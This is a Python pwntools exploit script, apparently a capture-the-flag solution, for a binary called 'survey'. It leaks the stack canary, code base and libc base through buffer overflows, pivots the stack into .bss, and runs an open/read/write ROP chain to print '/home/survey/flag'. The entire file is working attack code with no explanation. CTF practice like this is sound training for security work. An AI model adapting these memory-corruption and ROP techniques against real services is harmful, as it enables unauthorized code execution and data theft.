#!/usr/bin/python3

from pwn import *
import sys
import tty
# chr(tty.CEOF)

binary_name = './survey'
binary_name = './S'
context.binary = binary_name

e = ELF(binary_name)

if len(sys.argv) > 1:
    #r = remote('140.112.31.97', 30201)
    r = remote('127.0.0.1', 10101)
    libc = ELF('./libc-2.29.so')
else:
    r = process(binary_name, env={"LD_PRELOAD": "./libc-2.29.so"})
    libc = ELF('./libc-2.29.so')

#### leak canary
r.recvuntil('What is your name')
r.send(b'A'*0x19) ###
r.recvuntil(b'A'*0x19)
canary = u64(b'\x00'+r.recv(7))
code_base = u64(r.recv(6)+b'\x00\x00') - 0x12f0 # __libc_csu_init

leave_ret = 0x12e1 + code_base
bss = 0x4d00 + code_base
bss2 = 0x4d00 + code_base
read1 = 0x1255 + code_base
read2 = 0x1292 + code_base
fflush1 = 0x1246 + code_base
stdout = e.symbols['stdout'] + code_base

log.info(f"canary: {hex(canary)}")
log.info(f"code_base: {hex(code_base)}")
log.info(f"stdout: {hex(stdout)}")
log.info(f"target: {hex(stdout+0x18)}")
log.info(f"bss1: {hex(bss)}")
log.info(f"bss2: {hex(bss2)}")

##### ROP change rsp
r.sendafter('your message here :', b'A'*0x18 + p64(canary) + p64(bss) + p64(read2)) ###
r.sendafter('Thanks for your feedbacks', b'B'*0x18 + p64(canary) + p64(bss-0x38) + p64(fflush1)) ###
input()
r.sendafter('Thanks for your feedbacks', b'C'*0x30) ###
r.recvuntil('C'*0x30)
#bss -= 0x300
libc_base = u64(r.recv(6)+b'\x00\x00') - libc.sym['_IO_2_1_stdout_']
r.sendafter('Leave your message here : ', b'D'*0x18 + p64(canary) + p64(bss+0x28) + p64(read2)) ###
log.info(f"libc_base: {hex(libc_base)}")

##### stack ROP #####
pop_rdi_ret = 0x0000000000026542 + libc_base
pop_rsi_ret = 0x0000000000026f9e + libc_base
pop_rdx_ret = 0x000000000012bda6 + libc_base
pop_rax_ret = 0x0000000000047cf8 + libc_base
syscall_ret = 0x00000000000cf6c5 + libc_base

# _IO_stdfile_1_lock offset
# local 0x3ed8c0
# remote 0x58c580
rop_offset = 0x60
rop_addr = libc_base + 0x1e7580 + rop_offset
flag_addr = rop_addr + 0xc0

ROP = flat(
    ### open ###
    pop_rdi_ret,
    flag_addr,
    pop_rsi_ret,
    0,
    pop_rdx_ret,
    0,
    pop_rax_ret,
    2,
    syscall_ret,
    ### read ###
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    bss + 0x100,
    pop_rdx_ret,
    0x40,
    pop_rax_ret,
    0,
    syscall_ret,
    ### write ###
    pop_rdi_ret,
    1,
    pop_rax_ret,
    1,
    syscall_ret,
    fflush1,
    b'/home/survey/flag'.ljust(0x18, b'\x00'),
)
log.info(f'< ROP start >: {hex(rop_addr)}')
r.sendafter('Thanks for your feedbacks', p64(pop_rdx_ret) + p64(0x300) + p64(code_base+0x1261) + p64(canary) + p64(bss) + p64(leave_ret))
r.sendafter('Thanks for your feedbacks', b'\x00'*(rop_offset-8) + p64(bss) + ROP)
input()
r.sendafter('Leave your message here :', b'E'*0x18 + p64(canary) + p64(rop_addr-8) + p64(leave_ret))
r.recvuntil('Thanks for your feedbacks')
r.interactive()
